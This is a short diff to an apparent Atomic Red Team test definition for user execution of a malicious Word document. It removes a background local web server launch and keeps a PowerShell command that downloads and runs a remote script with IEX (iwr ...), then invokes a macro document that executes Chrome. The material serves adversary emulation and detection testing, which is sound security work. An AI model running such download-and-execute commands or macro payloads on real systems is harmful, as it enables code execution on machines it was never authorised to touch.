@@ -280,8 +280,6 @@ atomic_tests:
       Write-Host "You will need to install Microsoft Word manually to meet this requirement"
   executor:
     command: |
-      function bg() {Start-Process -NoNewWindow @args}
-      bg Powershell.exe PathToAtomicsFolder\T1204.002\src\simplewebserver.ps1
       IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
       Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1204.002\src\chromeexec-macrocode.txt" -officeProduct "Word" -sub "ExecChrome"
     cleanup_command: |
